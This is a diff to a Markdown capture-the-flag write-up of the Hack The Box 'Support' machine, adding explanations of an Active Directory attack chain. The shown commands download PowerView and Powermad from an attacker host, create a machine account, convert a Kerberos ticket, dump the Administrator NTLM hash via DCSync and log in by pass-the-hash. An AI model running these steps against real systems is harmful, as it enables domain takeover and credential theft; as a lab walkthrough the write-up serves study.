@@ -1345,7 +1345,10 @@ INFO: Done in 00M 07S
 
 ## Exploitation
 
-(here i just followed the steps explained in bloodhound)
+(here i just followed the steps explained in bloodhound), explain them briefly.
+
+Downloading and importing powermad onto the target:
+
 ```
  (New-Object Net.WebClient).DownloadFile('http://10.10.14.254:8000/Powermad.ps1','C:\Users\support\Documents\Powermad.ps1')
 ```
@@ -1358,6 +1361,8 @@ INFO: Done in 00M 07S
 *Evil-WinRM* PS C:\Users\support\Documents> New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)
 [+] Machine account attackersystem added
 ```
+
+Downloading and importing powerview onto the target:
 
 ```
 *Evil-WinRM* PS C:\Users\support\Documents> (New-Object Net.WebClient).DownloadFile('http://10.10.14.254:8000/PowerView.ps1','C:\Users\support\Documents\PowerView.ps1')
@@ -1610,6 +1615,8 @@ heredoc> EOF
 tr -d '[:space:]' < admin.b64 > administrator.b64
 ```
 
+The base64 ticket is converted into kirbi, and consequently into a ccache file which is then exported to perform a Dsync attack:
+
 ```
 base64 -d administrator.b64 > administrator.kirbi
 ```
@@ -1621,6 +1628,8 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 [*] converting kirbi to ccache...
 [+] done                                            
 ```
+
+Performing dcsync and retrieving the administrator NTLM hash:
 
 ```
 impacket-secretsdump -k -no-pass -dc-ip 10.129.50.211 support.htb/administrator@dc.support.htb -just-dc-user Administrator
@@ -1636,6 +1645,8 @@ Administrator:des-cbc-md5:13a8c8abc12f945e
 [*] Cleaning up... 
 
 ```
+
+Performing a PtH attack over the adminnistrator account grants domain compromise:
 
 ```
 evil-winrm -i 10.129.50.211 -u Administrator -H bb06cbc02b39abeddd1335bc30b19e26
@@ -1672,28 +1683,23 @@ d-----         5/19/2022   2:32 AM                WindowsPowerShell
 Mode                 LastWriteTime         Length Name
 ----                 -------------         ------ ----
 -ar---         7/13/2026   5:29 AM             34 root.txt
+```
 
+## Root Flag
+
+```
 
 *Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
-11e43cf5545779de8d02cb4136ad2b3b
+11e43cf5545779de8d02cb4136ad2b3b censor
 *Evil-WinRM* PS C:\Users\Administrator\Desktop> 
 
 ```
 
 
-
-### Exploitation
-
-Step-by-step privilege escalation.
-
-```shell
-# Commands used
-```
-
 ---
 ## Remediation
 
-- Key takeaway 1
+- Exposed credentials in the smb share
 - Key takeaway 2
 - Key takeaway 3
 
